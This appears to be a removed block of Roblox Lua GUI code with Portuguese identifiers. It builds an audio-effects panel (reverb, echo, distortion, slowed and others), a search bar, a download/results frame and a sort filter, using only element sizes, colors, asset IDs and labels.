-IconeAgudos.Position = UDim2.new(0, 0, 0, 0)
-IconeAgudos.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeAgudos.BackgroundTransparency = 0
-IconeAgudos.Image = "rbxassetid://91932971942355"
-IconeAgudos.Parent = Agudos
-AgudosBox = Instance.new("TextBox")
-AgudosBox.Size = UDim2.new(0, 182, 1, 0)
-AgudosBox.Position = UDim2.new(0, 39, 0, 0)
-AgudosBox.BackgroundTransparency = 1
-AgudosBox.Text = "1"
-AgudosBox.PlaceholderText = Traducao.Agudos
-AgudosBox.TextWrapped = true
-AgudosBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-AgudosBox.Font = Enum.Font.SourceSansBold
-AgudosBox.TextScaled = true
-AgudosBox.Parent = Agudos
-EfeitosTitulo = Instance.new("Frame")
-EfeitosTitulo.Size = UDim2.new(0, 219, 0, 25)
-EfeitosTitulo.Position = UDim2.new(0, 8, 0, 295)
-EfeitosTitulo.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-EfeitosTitulo.BackgroundTransparency = 0.6
-EfeitosTitulo.BorderSizePixel = 1
-EfeitosTitulo.Parent = ScrollEqua
-TextoEfeitos = Instance.new("TextLabel")
-TextoEfeitos.Size = UDim2.new(1, -70, 1, -4)
-TextoEfeitos.Position = UDim2.new(0, 35, 0, 2)
-TextoEfeitos.BackgroundTransparency = 1
-TextoEfeitos.Text = Traducao.Efeitos
-TextoEfeitos.Font = Enum.Font.Garamond
-TextoEfeitos.TextColor3 = Color3.fromRGB(255, 0, 0)
-TextoEfeitos.TextScaled = true
-TextoEfeitos.Parent = EfeitosTitulo
-Nenhum = Instance.new("ImageButton")
-Nenhum.Name = "Nenhum"
-Nenhum.Size = UDim2.new(0, 219, 0, 35)
-Nenhum.Position = UDim2.new(0, 8, 0, 340)
-Nenhum.AutoButtonColor = false
-Nenhum.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
-Nenhum.Parent = ScrollEqua
-IconeNenhum = Instance.new("ImageLabel")
-IconeNenhum.Size = UDim2.new(0, 35, 0, 35)
-IconeNenhum.Position = UDim2.new(0, 0, 0, 0)
-IconeNenhum.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeNenhum.BackgroundTransparency = 0
-IconeNenhum.Image = "rbxassetid://130043384241999"
-IconeNenhum.Parent = Nenhum
-NenhumTexto = Instance.new("TextLabel")
-NenhumTexto.Size = UDim2.new(0, 182, 1, 0)
-NenhumTexto.Position = UDim2.new(0, 39, 0, 0)
-NenhumTexto.BackgroundTransparency = 1
-NenhumTexto.Text = Traducao.Nenhum
-NenhumTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-NenhumTexto.Font = Enum.Font.SourceSansBold
-NenhumTexto.TextScaled = true
-NenhumTexto.Parent = Nenhum
-Reverb = Instance.new("ImageButton")
-Reverb.Name = "Reverb"
-Reverb.Size = UDim2.new(0, 219, 0, 35)
-Reverb.Position = UDim2.new(0, 8, 0, 385)
-Reverb.AutoButtonColor = false
-Reverb.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Reverb.Parent = ScrollEqua
-IconeReverb = Instance.new("ImageLabel")
-IconeReverb.Size = UDim2.new(0, 35, 0, 35)
-IconeReverb.Position = UDim2.new(0, 0, 0, 0)
-IconeReverb.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeReverb.BackgroundTransparency = 0
-IconeReverb.Image = "rbxassetid://72645952367955"
-IconeReverb.Parent = Reverb
-ReverbTexto = Instance.new("TextLabel")
-ReverbTexto.Size = UDim2.new(0, 182, 1, 0)
-ReverbTexto.Position = UDim2.new(0, 39, 0, 0)
-ReverbTexto.BackgroundTransparency = 1
-ReverbTexto.Text = "Reverb"
-ReverbTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-ReverbTexto.Font = Enum.Font.SourceSansBold
-ReverbTexto.TextScaled = true
-ReverbTexto.Parent = Reverb
-Echo = Instance.new("ImageButton")
-Echo.Name = "Echo"
-Echo.Size = UDim2.new(0, 219, 0, 35)
-Echo.Position = UDim2.new(0, 8, 0, 430)
-Echo.AutoButtonColor = false
-Echo.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Echo.Parent = ScrollEqua
-IconeEcho = Instance.new("ImageLabel")
-IconeEcho.Size = UDim2.new(0, 35, 0, 35)
-IconeEcho.Position = UDim2.new(0, 0, 0, 0)
-IconeEcho.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeEcho.BackgroundTransparency = 0
-IconeEcho.Image = "rbxassetid://72645952367955"
-IconeEcho.Parent = Echo
-EchoTexto = Instance.new("TextLabel")
-EchoTexto.Size = UDim2.new(0, 182, 1, 0)
-EchoTexto.Position = UDim2.new(0, 39, 0, 0)
-EchoTexto.BackgroundTransparency = 1
-EchoTexto.Text = "Echo"
-EchoTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-EchoTexto.Font = Enum.Font.SourceSansBold
-EchoTexto.TextScaled = true
-EchoTexto.Parent = Echo
-Distortion = Instance.new("ImageButton")
-Distortion.Name = "Distortion"
-Distortion.Size = UDim2.new(0, 219, 0, 35)
-Distortion.Position = UDim2.new(0, 8, 0, 475)
-Distortion.AutoButtonColor = false
-Distortion.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Distortion.Parent = ScrollEqua
-IconeDistortion = Instance.new("ImageLabel")
-IconeDistortion.Size = UDim2.new(0, 35, 0, 35)
-IconeDistortion.Position = UDim2.new(0, 0, 0, 0)
-IconeDistortion.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeDistortion.Image = "rbxassetid://72645952367955"
-IconeDistortion.Parent = Distortion
-DistortionTexto = Instance.new("TextLabel")
-DistortionTexto.Size = UDim2.new(0, 182, 1, 0)
-DistortionTexto.Position = UDim2.new(0, 39, 0, 0)
-DistortionTexto.BackgroundTransparency = 1
-DistortionTexto.Text = "Distortion"
-DistortionTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-DistortionTexto.Font = Enum.Font.SourceSansBold
-DistortionTexto.TextScaled = true
-DistortionTexto.Parent = Distortion
-Chorus = Instance.new("ImageButton")
-Chorus.Name = "Chorus"
-Chorus.Size = UDim2.new(0, 219, 0, 35)
-Chorus.Position = UDim2.new(0, 8, 0, 520)
-Chorus.AutoButtonColor = false
-Chorus.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Chorus.Parent = ScrollEqua
-IconeChorus = Instance.new("ImageLabel")
-IconeChorus.Size = UDim2.new(0, 35, 0, 35)
-IconeChorus.Position = UDim2.new(0, 0, 0, 0)
-IconeChorus.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeChorus.Image = "rbxassetid://72645952367955"
-IconeChorus.Parent = Chorus
-ChorusTexto = Instance.new("TextLabel")
-ChorusTexto.Size = UDim2.new(0, 182, 1, 0)
-ChorusTexto.Position = UDim2.new(0, 39, 0, 0)
-ChorusTexto.BackgroundTransparency = 1
-ChorusTexto.Text = "Chorus"
-ChorusTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-ChorusTexto.Font = Enum.Font.SourceSansBold
-ChorusTexto.TextScaled = true
-ChorusTexto.Parent = Chorus
-Flanger = Instance.new("ImageButton")
-Flanger.Name = "Flanger"
-Flanger.Size = UDim2.new(0, 219, 0, 35)
-Flanger.Position = UDim2.new(0, 8, 0, 565)
-Flanger.AutoButtonColor = false
-Flanger.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Flanger.Parent = ScrollEqua
-IconeFlanger = Instance.new("ImageLabel")
-IconeFlanger.Size = UDim2.new(0, 35, 0, 35)
-IconeFlanger.Position = UDim2.new(0, 0, 0, 0)
-IconeFlanger.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeFlanger.Image = "rbxassetid://72645952367955"
-IconeFlanger.Parent = Flanger
-FlangerTexto = Instance.new("TextLabel")
-FlangerTexto.Size = UDim2.new(0, 182, 1, 0)
-FlangerTexto.Position = UDim2.new(0, 39, 0, 0)
-FlangerTexto.BackgroundTransparency = 1
-FlangerTexto.Text = "Flanger"
-FlangerTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-FlangerTexto.Font = Enum.Font.SourceSansBold
-FlangerTexto.TextScaled = true
-FlangerTexto.Parent = Flanger
-Tremolo = Instance.new("ImageButton")
-Tremolo.Name = "Tremolo"
-Tremolo.Size = UDim2.new(0, 219, 0, 35)
-Tremolo.Position = UDim2.new(0, 8, 0, 610)
-Tremolo.AutoButtonColor = false
-Tremolo.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Tremolo.Parent = ScrollEqua
-IconeTremolo = Instance.new("ImageLabel")
-IconeTremolo.Size = UDim2.new(0, 35, 0, 35)
-IconeTremolo.Position = UDim2.new(0, 0, 0, 0)
-IconeTremolo.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeTremolo.Image = "rbxassetid://72645952367955"
-IconeTremolo.Parent = Tremolo
-TremoloTexto = Instance.new("TextLabel")
-TremoloTexto.Size = UDim2.new(0, 182, 1, 0)
-TremoloTexto.Position = UDim2.new(0, 39, 0, 0)
-TremoloTexto.BackgroundTransparency = 1
-TremoloTexto.Text = "Tremolo"
-TremoloTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-TremoloTexto.Font = Enum.Font.SourceSansBold
-TremoloTexto.TextScaled = true
-TremoloTexto.Parent = Tremolo
-Compressor = Instance.new("ImageButton")
-Compressor.Name = "Compressor"
-Compressor.Size = UDim2.new(0, 219, 0, 35)
-Compressor.Position = UDim2.new(0, 8, 0, 655)
-Compressor.AutoButtonColor = false
-Compressor.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Compressor.Parent = ScrollEqua
-IconeCompressor = Instance.new("ImageLabel")
-IconeCompressor.Size = UDim2.new(0, 35, 0, 35)
-IconeCompressor.Position = UDim2.new(0, 0, 0, 0)
-IconeCompressor.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeCompressor.Image = "rbxassetid://72645952367955"
-IconeCompressor.Parent = Compressor
-CompressorTexto = Instance.new("TextLabel")
-CompressorTexto.Size = UDim2.new(0, 182, 1, 0)
-CompressorTexto.Position = UDim2.new(0, 39, 0, 0)
-CompressorTexto.BackgroundTransparency = 1
-CompressorTexto.Text = "Compressor"
-CompressorTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-CompressorTexto.Font = Enum.Font.SourceSansBold
-CompressorTexto.TextScaled = true
-CompressorTexto.Parent = Compressor
-Radio = Instance.new("ImageButton")
-Radio.Name = "Radio"
-Radio.Size = UDim2.new(0, 219, 0, 35)
-Radio.Position = UDim2.new(0, 8, 0, 700)
-Radio.AutoButtonColor = false
-Radio.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Radio.Parent = ScrollEqua
-IconeRadio = Instance.new("ImageLabel")
-IconeRadio.Size = UDim2.new(0, 35, 0, 35)
-IconeRadio.Position = UDim2.new(0, 0, 0, 0)
-IconeRadio.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeRadio.Image = "rbxassetid://72645952367955"
-IconeRadio.Parent = Radio
-RadioTexto = Instance.new("TextLabel")
-RadioTexto.Size = UDim2.new(0, 182, 1, 0)
-RadioTexto.Position = UDim2.new(0, 39, 0, 0)
-RadioTexto.BackgroundTransparency = 1
-RadioTexto.Text = "Radio"
-RadioTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-RadioTexto.Font = Enum.Font.SourceSansBold
-RadioTexto.TextScaled = true
-RadioTexto.Parent = Radio
-Cinema = Instance.new("ImageButton")
-Cinema.Name = "Cinema"
-Cinema.Size = UDim2.new(0, 219, 0, 35)
-Cinema.Position = UDim2.new(0, 8, 0, 745)
-Cinema.AutoButtonColor = false
-Cinema.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Cinema.Parent = ScrollEqua
-IconeCinema = Instance.new("ImageLabel")
-IconeCinema.Size = UDim2.new(0, 35, 0, 35)
-IconeCinema.Position = UDim2.new(0, 0, 0, 0)
-IconeCinema.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeCinema.Image = "rbxassetid://72645952367955"
-IconeCinema.Parent = Cinema
-CinemaTexto = Instance.new("TextLabel")
-CinemaTexto.Size = UDim2.new(0, 182, 1, 0)
-CinemaTexto.Position = UDim2.new(0, 39, 0, 0)
-CinemaTexto.BackgroundTransparency = 1
-CinemaTexto.Text = "Cinema"
-CinemaTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-CinemaTexto.Font = Enum.Font.SourceSansBold
-CinemaTexto.TextScaled = true
-CinemaTexto.Parent = Cinema
-Underwater = Instance.new("ImageButton")
-Underwater.Name = "Underwater"
-Underwater.Size = UDim2.new(0, 219, 0, 35)
-Underwater.Position = UDim2.new(0, 8, 0, 790)
-Underwater.AutoButtonColor = false
-Underwater.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Underwater.Parent = ScrollEqua
-IconeUnderwater = Instance.new("ImageLabel")
-IconeUnderwater.Size = UDim2.new(0, 35, 0, 35)
-IconeUnderwater.Position = UDim2.new(0, 0, 0, 0)
-IconeUnderwater.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeUnderwater.Image = "rbxassetid://72645952367955"
-IconeUnderwater.Parent = Underwater
-UnderwaterTexto = Instance.new("TextLabel")
-UnderwaterTexto.Size = UDim2.new(0, 182, 1, 0)
-UnderwaterTexto.Position = UDim2.new(0, 39, 0, 0)
-UnderwaterTexto.BackgroundTransparency = 1
-UnderwaterTexto.Text = "Underwater"
-UnderwaterTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-UnderwaterTexto.Font = Enum.Font.SourceSansBold
-UnderwaterTexto.TextScaled = true
-UnderwaterTexto.Parent = Underwater
-Kid = Instance.new("ImageButton")
-Kid.Name = "Kid"
-Kid.Size = UDim2.new(0, 219, 0, 35)
-Kid.Position = UDim2.new(0, 8, 0, 835)
-Kid.AutoButtonColor = false
-Kid.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Kid.Parent = ScrollEqua
-IconeKid = Instance.new("ImageLabel")
-IconeKid.Size = UDim2.new(0, 35, 0, 35)
-IconeKid.Position = UDim2.new(0, 0, 0, 0)
-IconeKid.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeKid.BackgroundTransparency = 0
-IconeKid.Image = "rbxassetid://72645952367955"
-IconeKid.Parent = Kid
-KidTexto = Instance.new("TextLabel")
-KidTexto.Size = UDim2.new(0, 182, 1, 0)
-KidTexto.Position = UDim2.new(0, 39, 0, 0)
-KidTexto.BackgroundTransparency = 1
-KidTexto.Text = "Kid"
-KidTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-KidTexto.Font = Enum.Font.SourceSansBold
-KidTexto.TextScaled = true
-KidTexto.Parent = Kid
-Robot = Instance.new("ImageButton")
-Robot.Name = "Robot"
-Robot.Size = UDim2.new(0, 219, 0, 35)
-Robot.Position = UDim2.new(0, 8, 0, 880)
-Robot.AutoButtonColor = false
-Robot.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Robot.Parent = ScrollEqua
-IconeRobot = Instance.new("ImageLabel")
-IconeRobot.Size = UDim2.new(0, 35, 0, 35)
-IconeRobot.Position = UDim2.new(0, 0, 0, 0)
-IconeRobot.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeRobot.BackgroundTransparency = 0
-IconeRobot.Image = "rbxassetid://72645952367955"
-IconeRobot.Parent = Robot
-RobotTexto = Instance.new("TextLabel")
-RobotTexto.Size = UDim2.new(0, 182, 1, 0)
-RobotTexto.Position = UDim2.new(0, 39, 0, 0)
-RobotTexto.BackgroundTransparency = 1
-RobotTexto.Text = "Bug"
-RobotTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-RobotTexto.Font = Enum.Font.SourceSansBold
-RobotTexto.TextScaled = true
-RobotTexto.Parent = Robot
-Slowed = Instance.new("ImageButton")
-Slowed.Name = "Slowed"
-Slowed.Size = UDim2.new(0, 219, 0, 35)
-Slowed.Position = UDim2.new(0, 8, 0, 925)
-Slowed.AutoButtonColor = false
-Slowed.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Slowed.Parent = ScrollEqua
-IconeSlowed = Instance.new("ImageLabel")
-IconeSlowed.Size = UDim2.new(0, 35, 0, 35)
-IconeSlowed.Position = UDim2.new(0, 0, 0, 0)
-IconeSlowed.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeSlowed.BackgroundTransparency = 0
-IconeSlowed.Image = "rbxassetid://72645952367955"
-IconeSlowed.Parent = Slowed
-SlowedTexto = Instance.new("TextLabel")
-SlowedTexto.Size = UDim2.new(0, 182, 1, 0)
-SlowedTexto.Position = UDim2.new(0, 39, 0, 0)
-SlowedTexto.BackgroundTransparency = 1
-SlowedTexto.Text = "Slowed"
-SlowedTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-SlowedTexto.Font = Enum.Font.SourceSansBold
-SlowedTexto.TextScaled = true
-SlowedTexto.Parent = Slowed
-ResetarEqua = Instance.new("ImageButton")
-ResetarEqua.Name = "Resetar"
-ResetarEqua.Size = UDim2.new(0, 219, 0, 35)
-ResetarEqua.Position = UDim2.new(0, 8, 0, 975)
-ResetarEqua.AutoButtonColor = false
-ResetarEqua.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-ResetarEqua.Parent = ScrollEqua
-ResetarTexto = Instance.new("TextLabel")
-ResetarTexto.Size = UDim2.new(1, 0, 1, 0)
-ResetarTexto.Position = UDim2.new(0, 0, 0, 0)
-ResetarTexto.BackgroundTransparency = 1
-ResetarTexto.Text = "Reset"
-ResetarTexto.TextColor3 = Color3.fromRGB(255, 0, 0)
-ResetarTexto.Font = Enum.Font.SourceSansBold
-ResetarTexto.TextScaled = true
-ResetarTexto.Parent = ResetarEqua
-Pesquisa = Instance.new("Frame")
-Pesquisa.Size = UDim2.new(0, 235, 0, 43)
-Pesquisa.Position = UDim2.new(0, 6, 0, 6)
-Pesquisa.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-Pesquisa.BorderSizePixel = 0
-Pesquisa.Parent = Tela4
-Lupa = Instance.new("ImageButton")
-Lupa.Size = UDim2.new(0, 43, 0, 43)
-Lupa.Position = UDim2.new(0, 0, 0, 0)
-Lupa.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
-Lupa.Image = "rbxassetid://78857002895466"
-Lupa.Active = true
-Lupa.Parent = Pesquisa
-Linha = Instance.new("Frame")
-Linha.Size = UDim2.new(0, 2, 1, 0)
-Linha.Position = UDim2.new(0, 43, 0, 0)
-Linha.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-Linha.BorderSizePixel = 0
-Linha.Parent = Pesquisa
-PesquisarBox = Instance.new("TextBox")
-PesquisarBox.Size = UDim2.new(0, 139, 0, 37)
-PesquisarBox.Position = UDim2.new(0, 48, 0, 3)
-PesquisarBox.Text = ""
-PesquisarBox.PlaceholderText = Traducao.Pesquisar
-PesquisarBox.TextScaled = true
-PesquisarBox.TextWrapped = true
-PesquisarBox.ClearTextOnFocus = false
-PesquisarBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-PesquisarBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
-PesquisarBox.BackgroundTransparency = 1
-PesquisarBox.Active = true
-PesquisarBox.Parent = Pesquisa
-Linha2 = Instance.new("Frame")
-Linha2.Size = UDim2.new(0, 2, 1, 0)
-Linha2.Position = UDim2.new(0, 190, 0, 0)
-Linha2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-Linha2.BorderSizePixel = 0
-Linha2.Parent = Pesquisa
-Filtro = Instance.new("ImageButton")
-Filtro.Size = UDim2.new(0, 33, 0, 33)
-Filtro.Position = UDim2.new(0, 197, 0, 5)
-Filtro.AutoButtonColor = false
-Filtro.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Filtro.Image = "rbxassetid://128216827107080"
-Filtro.Parent = Pesquisa
-DownloadFrame = Instance.new("Frame")
-DownloadFrame.Size = UDim2.new(0, 235, 0, 151)
-DownloadFrame.Position = UDim2.new(0, 6, 0, 58)
-DownloadFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-DownloadFrame.BorderSizePixel = 0
-DownloadFrame.Parent = Tela4
-DownloadFrameTexto = Instance.new("TextLabel")
-DownloadFrameTexto.Size = UDim2.new(0, 223, 0, 40)
-DownloadFrameTexto.Position = UDim2.new(0, 6, 0, 105)
-DownloadFrameTexto.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-DownloadFrameTexto.BackgroundTransparency = 0.5
-DownloadFrameTexto.RichText = true
-DownloadFrameTexto.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.PesquiseTitle .. "</font>\n<font color=\"rgb(192,192,192)\">" .. Traducao.PesquiseText .. "</font>"
-DownloadFrameTexto.Font = Enum.Font.SourceSansBold
-DownloadFrameTexto.TextScaled = true
-DownloadFrameTexto.Visible = true
-DownloadFrameTexto.Parent = DownloadFrame
-padding2 = Instance.new("UIPadding")
-padding2.PaddingLeft = UDim.new(0, 2)
-padding2.PaddingRight = UDim.new(0, 2)
-padding2.PaddingTop = UDim.new(0, 2)
-padding2.PaddingBottom = UDim.new(0, 2)
-padding2.Parent = DownloadFrameTexto
-PaginaFrame = Instance.new("Frame")
-PaginaFrame.Size = UDim2.new(0, 235, 0, 27)
-PaginaFrame.Position = UDim2.new(0, 6, 0, 218)
-PaginaFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-PaginaFrame.BorderSizePixel = 0
-PaginaFrame.Visible = false
-PaginaFrame.Parent = Tela4
-ScrollPagina = Instance.new("ScrollingFrame")
-ScrollPagina.Size = UDim2.new(1, -6, 1, 0)
-ScrollPagina.Position = UDim2.new(0, 3, 0, 0)
-ScrollPagina.BackgroundTransparency = 1
-ScrollPagina.BorderSizePixel = 0
-ScrollPagina.ScrollBarThickness = 1
-ScrollPagina.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ScrollPagina.ScrollBarImageTransparency = 0.5
-ScrollPagina.CanvasSize = UDim2.new(0, 280, 0, 0)
-ScrollPagina.ScrollingDirection = Enum.ScrollingDirection.X
-ScrollPagina.ClipsDescendants = true
-ScrollPagina.Parent = PaginaFrame
-PaginaEsperandoFrame = Instance.new("Frame")
-PaginaEsperandoFrame.Size = UDim2.new(0, 235, 0, 27)
-PaginaEsperandoFrame.Position = UDim2.new(0, 6, 0, 218)
-PaginaEsperandoFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-PaginaEsperandoFrame.BorderSizePixel = 0
-PaginaEsperandoFrame.Visible = true
-PaginaEsperandoFrame.Parent = Tela4
-PaginaEsperandoIcon = Instance.new("ImageLabel")
-PaginaEsperandoIcon.Size = UDim2.new(0, 27, 0, 27)
-PaginaEsperandoIcon.Position = UDim2.new(0, 0, 0, 0)
-PaginaEsperandoIcon.BackgroundTransparency = 1
-PaginaEsperandoIcon.Image = "rbxassetid://130610275359163"
-PaginaEsperandoIcon.Parent = PaginaEsperandoFrame
-PaginaEsperandoText = Instance.new("TextLabel")
-PaginaEsperandoText.Size = UDim2.new(1, -36, 1, 0)
-PaginaEsperandoText.Position = UDim2.new(0, 32, 0, 0)
-PaginaEsperandoText.RichText = true
-PaginaEsperandoText.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.RecursoTi .. "</font>\n<font color=\"rgb(192,192,192)\">" .. Traducao.NaoPodePagina .. "</font>"
-PaginaEsperandoText.TextScaled = true
-PaginaEsperandoText.Font = Enum.Font.SourceSansBold
-PaginaEsperandoText.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-PaginaEsperandoText.BackgroundTransparency = 1
-PaginaEsperandoText.BorderSizePixel = 0
-PaginaEsperandoText.Parent = PaginaEsperandoFrame
-Aguardando = Instance.new("ImageLabel")
-Aguardando.Size = UDim2.new(0, 80, 0, 80)
-Aguardando.AnchorPoint = Vector2.new(0.5, 0.5)
-Aguardando.Position = UDim2.new(0.5, 2, 0.5, -20)
-Aguardando.BackgroundTransparency = 1
-Aguardando.Image = "rbxassetid://130321829564804"
-Aguardando.Visible = true
-Aguardando.Parent = DownloadFrame
-Loading = Instance.new("ImageLabel")
-Loading.Size = UDim2.new(0, 75, 0, 75)
-Loading.AnchorPoint = Vector2.new(0.5, 0.5)
-Loading.Position = UDim2.new(0.5, 0, 0.5, -2)
-Loading.BackgroundTransparency = 1
-Loading.Image = "rbxassetid://124877910068047"
-Loading.Visible = false
-Loading.Parent = DownloadFrame
-SemResultado = Instance.new("ImageLabel")
-SemResultado.Size = UDim2.new(0, 80, 0, 80)
-SemResultado.AnchorPoint = Vector2.new(0.5, 0.5)
-SemResultado.Position = UDim2.new(0.5, 3, 0.5, -20)
-SemResultado.BackgroundTransparency = 1
-SemResultado.Image = "rbxassetid://94766101394526"
-SemResultado.Visible = false
-SemResultado.Parent = DownloadFrame
-Resultados = Instance.new("Frame")
-Resultados.Size = UDim2.new(1, 0, 1, -4)
-Resultados.Position = UDim2.new(0, 0, 0, 2)
-Resultados.BackgroundTransparency = 1
-Resultados.BorderSizePixel = 0
-Resultados.ClipsDescendants = true
-Resultados.Parent = DownloadFrame
-FiltroFrame = Instance.new("Frame")
-FiltroFrame.Size = UDim2.new(1, 0, 1, 0)
-FiltroFrame.Position = UDim2.new(0, 0, 0, 0)
-FiltroFrame.BackgroundTransparency = 1
-FiltroFrame.BorderSizePixel = 0
-FiltroFrame.Visible = false
-FiltroFrame.Parent = Resultados
-TituloFiltro = Instance.new("TextLabel")
-TituloFiltro.Size = UDim2.new(0, 227, 0, 24)
-TituloFiltro.Position = UDim2.new(0, 4, 0, 2)
-TituloFiltro.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-TituloFiltro.TextColor3 = Color3.fromRGB(255, 255, 255)
-TituloFiltro.BackgroundTransparency = 0.5
-TituloFiltro.BorderSizePixel = 0
-TituloFiltro.Text = Traducao.Filter
-TituloFiltro.TextSize = 12
-TituloFiltro.Parent = FiltroFrame
-Linha = Instance.new("Frame")
-Linha.Size = UDim2.new(1, 0, 0, 2)
-Linha.Position = UDim2.new(0, 0, 0, 30)
-Linha.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-Linha.BorderSizePixel = 0
-Linha.Parent = FiltroFrame
-ScrollFiltro = Instance.new("ScrollingFrame")
-ScrollFiltro.Size = UDim2.new(1, -1, 1, -10)
-ScrollFiltro.Position = UDim2.new(0, 0, 0, 34)
-ScrollFiltro.BackgroundTransparency = 1
-ScrollFiltro.BorderSizePixel = 0
-ScrollFiltro.ScrollBarThickness = 1
-ScrollFiltro.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ScrollFiltro.ScrollBarImageTransparency = 0.5
-ScrollFiltro.CanvasSize = UDim2.new(0, 0, 0, 210)
-ScrollFiltro.ScrollingDirection = Enum.ScrollingDirection.Y
-ScrollFiltro.ClipsDescendants = true
-ScrollFiltro.Parent = FiltroFrame
-Relevancia = Instance.new("ImageButton")
-Relevancia.Size = UDim2.new(0, 221, 0, 35)
-Relevancia.Position = UDim2.new(0, 7, 0, 5)
-Relevancia.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Relevancia.BorderSizePixel = 0
-Relevancia.AutoButtonColor = false
-Relevancia.Parent = ScrollFiltro
-DataUpload = Instance.new("ImageButton")
-DataUpload.Size = UDim2.new(0, 221, 0, 35)
-DataUpload.Position = UDim2.new(0, 7, 0, 50)
-DataUpload.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-DataUpload.BackgroundTransparency = 0
-DataUpload.BorderSizePixel = 0
-DataUpload.AutoButtonColor = false
-DataUpload.Active = true
-DataUpload.Parent = ScrollFiltro
-Duracao = Instance.new("ImageButton")
-Duracao.Size = UDim2.new(0, 221, 0, 35)
-Duracao.Position = UDim2.new(0, 7, 0, 95)
-Duracao.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Duracao.BorderSizePixel = 0
-Duracao.AutoButtonColor = false
-Duracao.Parent = ScrollFiltro
-IconeRelevancia = Instance.new("ImageLabel")
-IconeRelevancia.Size = UDim2.new(0, 35, 0, 35)
-IconeRelevancia.Position = UDim2.new(0, 0, 0, 0)
-IconeRelevancia.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-IconeRelevancia.BackgroundTransparency = 0
-IconeRelevancia.Image = "rbxassetid://86663364934636"
-IconeRelevancia.Parent = Relevancia
-IconeDataUpload = Instance.new("ImageLabel")
-IconeDataUpload.Size = UDim2.new(0, 35, 0, 35)
-IconeDataUpload.Position = UDim2.new(0, 0, 0, 0)
-IconeDataUpload.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-IconeDataUpload.BackgroundTransparency = 0
-IconeDataUpload.Image = "rbxassetid://102239634857456"
-IconeDataUpload.ImageTransparency = 0
-IconeDataUpload.Parent = DataUpload
-IconeDuracao = Instance.new("ImageLabel")
-IconeDuracao.Size = UDim2.new(0, 35, 0, 35)
-IconeDuracao.Position = UDim2.new(0, 0, 0, 0)
-IconeDuracao.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-IconeDuracao.BackgroundTransparency = 0
-IconeDuracao.Image = "rbxassetid://124803568759863"
-IconeDuracao.Parent = Duracao
-RelevanciaTexto = Instance.new("TextLabel")
-RelevanciaTexto.Size = UDim2.new(0, 178, 1, 0)
-RelevanciaTexto.Position = UDim2.new(0, 39, 0, 0)
-RelevanciaTexto.BackgroundTransparency = 1
-RelevanciaTexto.Text = Traducao.Order .. "\n" .. Traducao.Relevance
-RelevanciaTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-RelevanciaTexto.Font = Enum.Font.SourceSansBold
-RelevanciaTexto.TextScaled = true
